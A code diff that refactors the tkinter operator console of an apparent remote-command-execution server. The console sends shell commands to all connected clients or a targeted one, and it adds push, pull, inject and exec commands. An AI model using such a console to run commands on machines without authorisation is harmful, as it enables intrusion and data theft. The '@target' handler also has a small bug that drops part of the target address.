@@ -2,7 +2,8 @@ import tkinter as tk
 from datetime import datetime
 from enum import Enum
 
-from src.core.message import MessageType, Message
+import config
+from src.core.message import Message, MessageType
 from src.core.observer import RCEEventObserver
 from src.server.rce_server import RCEServer
 
@@ -15,9 +16,12 @@ class ServerGUI(RCEEventObserver):
         PURPLE = "mediumorchid"
         BLACK = "black"
 
+    __TIME_FORMAT = "%Y-%m-%d %H:%M:%S"
+
     def __init__(self, server: RCEServer):
-        self.server = server
-        self.server.add_observer(self)
+        self.__server = server
+        self.__server.add_observer(self)
+        self.__target_client = None
 
         # ServerGUI
         self.main_window = tk.Tk()
@@ -38,20 +42,24 @@ class ServerGUI(RCEEventObserver):
 
         # Inputs
         self.server_start_button = tk.Button(self.header,
-                                             text="Start", command=self.start_server, font=('', 12, 'bold'))
+                                             text="Start", command=self.__start_rce_server, font=('', 12, 'bold'))
         self.server_stop_button = tk.Button(self.header,
-                                            text="Stop", command=self.stop_server, font=('', 12, 'bold'))
-        self.message_input = tk.Entry(self.content_bottom, font=('', 12, 'bold'))
-        self.send_message_button = tk.Button(self.content_bottom,
-                                             text="Send Message", command=self.send_message, font=('', 12, 'bold'))
+                                            text="Stop", command=self.__stop_rce_server, font=('', 12, 'bold'))
+        self.message_input = tk.Entry(self.content_bottom, font=('', 10, 'bold'))
+        self.send_message_button = tk.Button(self.content_bottom, text="Send Message", font=('', 12, 'bold'),
+                                             command=self.__handle_message_input)
 
         # Outputs
-        self.messages_area = tk.Text(self.content_top, font=('', 12, 'bold'))
-        self.clients_list = tk.Listbox(self.content_top, font=('', 12, 'bold'))
+        self.messages_area = tk.Text(self.content_top, font=('', 10, 'bold'))
+        self.clients_list = tk.Listbox(self.content_top, font=('', 11, 'bold'))
+        self.bind_events()
+
+    def bind_events(self):
+        self.message_input.bind("<Return>", lambda event: self.__handle_message_input())
 
     def close_windows(self):
-        if self.server.is_running():
-            self.server.stop()
+        if self.__server.is_running():
+            self.__server.stop()
         self.main_window.destroy()
         exit(0)
 
@@ -74,33 +82,63 @@ class ServerGUI(RCEEventObserver):
         self.build_content()
         self.main_window.mainloop()
 
-    def start_server(self):
-        """
-        Starts the RCE server
-        """
-        if self.server.start():
+    def __start_rce_server(self):
+        if self.__server.start():
             self.server_start_button["state"] = "disabled"
             self.server_stop_button["state"] = "normal"
 
-    def stop_server(self):
-        """
-        Stops the RCE server
-        """
-        if self.server.stop():
+    def __stop_rce_server(self):
+        if self.__server.stop():
             self.server_start_button["state"] = "normal"
             self.server_stop_button["state"] = "disabled"
 
-    def send_message(self):
-        """
-        Sends a message to all connected clients
-        """
-        message_string = self.message_input.get()
-        message = Message(message_type=MessageType.CMD, data=message_string.encode())
-        self.server.broadcast_message(message)
+    def __handle_message_input(self):
+        if message_string := self.message_input.get().strip():
+            self.__update_message_area(f"Server: {message_string}", color=ServerGUI.TextColors.BLACK)
+            self.__clear_message_input()
 
-        message_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: Server: {message_string}"
-        self.__update_message_area(message_format, color=ServerGUI.TextColors.BLACK)
-        self.message_input.delete(0, tk.END)
+            args = message_string.split(" ")
+            command = args[0]
+            if command.startswith("@"):
+                self.__handle_command(command, args[1:])
+                return
+
+            # Send shell commands
+            data = message_string.encode()
+            message = Message(message_type=MessageType.CMD, data=data)
+            if self.__target_client:
+                self.__server.send_message_to_client(self.__target_client, message)
+            else:
+                self.__server.broadcast_message(message)
+
+    def __handle_command(self, command: str, args: list):
+        if command == "@target":
+            target = ' '.join(args[1:])
+            self.__target_client = target
+            self.__update_message_area(f"Targeting {target}", color=ServerGUI.TextColors.FORREST_GREEN)
+            self.__clear_message_input()
+            return
+
+        data = ' '.join(args).encode()
+        if command == "@echo":
+            message = Message(message_type=MessageType.ECHO, data=data)
+        elif command == "@push":
+            message = Message(message_type=MessageType.FILE_UPLOAD, data=data)
+        elif command == "@pull":
+            message = Message(message_type=MessageType.FILE_DOWNLOAD, data=data)
+        elif command == "@inject":
+            message = Message(message_type=MessageType.INJECT, data=data)
+        elif command == "@exec":
+            message = Message(message_type=MessageType.EXECUTE)
+        else:
+            self.__update_message_area(f"Unknown command: {command}", color=ServerGUI.TextColors.RED)
+            self.__clear_message_input()
+            return
+
+        if self.__target_client:
+            self.__server.send_message_to_client(self.__target_client, message)
+        else:
+            self.__server.broadcast_message(message)
 
     def __update_message_area(self, message: str, color: TextColors = TextColors.DIM_GRAY):
         """
@@ -108,21 +146,23 @@ class ServerGUI(RCEEventObserver):
         :param message: The message to be added
         :param color: The color to be used to display the message
         """
+        message_format = f"{datetime.now().strftime(config.DATETIME_FORMAT)}: {message}"
         self.messages_area.config(state='normal')
         self.messages_area.tag_config(color.value, foreground=color.value)
-        self.messages_area.insert(tk.END, message + '\n', color.value)
+        self.messages_area.insert(tk.END, message_format + '\n', color.value)
         self.messages_area.config(state='disabled')
+        self.messages_area.see(tk.END)
+
+    def __clear_message_input(self):
+        self.message_input.delete(0, tk.END)
 
     def on_connect(self, client_address: str):
-        msg_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {client_address} connected"
-        self.__update_message_area(msg_format, color=ServerGUI.TextColors.FORREST_GREEN)
+        self.__update_message_area(f"{client_address} connected", color=ServerGUI.TextColors.FORREST_GREEN)
         self.clients_list.insert(tk.END, client_address)
         self.clients_list.update()
 
     def on_disconnect(self, client_address: str):
-        msg_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {client_address} disconnected"
-        self.__update_message_area(msg_format, color=ServerGUI.TextColors.FORREST_GREEN)
-
+        self.__update_message_area(f"{client_address} disconnected", color=ServerGUI.TextColors.FORREST_GREEN)
         for i in range(self.clients_list.size()):
             if self.clients_list.get(i) == client_address:
                 self.clients_list.delete(i)
@@ -130,20 +170,16 @@ class ServerGUI(RCEEventObserver):
         self.clients_list.update()
 
     def on_message(self, sender: str, message: str):
-        message_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {sender}: {message}"
-        self.__update_message_area(message_format, color=ServerGUI.TextColors.DIM_GRAY)
+        self.__update_message_area(f"{sender}: {message}", color=ServerGUI.TextColors.DIM_GRAY)
 
     def on_error(self, error: str, prefix=""):
-        error_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {error}"
-        self.__update_message_area(error_format, color=ServerGUI.TextColors.RED)
+        self.__update_message_area(error, color=ServerGUI.TextColors.RED)
 
     def on_info(self, message: str, prefix=""):
-        info_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {message}"
-        self.__update_message_area(info_format, color=ServerGUI.TextColors.FORREST_GREEN)
+        self.__update_message_area(message, color=ServerGUI.TextColors.FORREST_GREEN)
 
     def on_debug(self, message: str, prefix=""):
-        debug_format = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {message}"
-        self.__update_message_area(debug_format, color=ServerGUI.TextColors.PURPLE)
+        self.__update_message_area(message, color=ServerGUI.TextColors.PURPLE)
 
 
 if __name__ == "__main__":
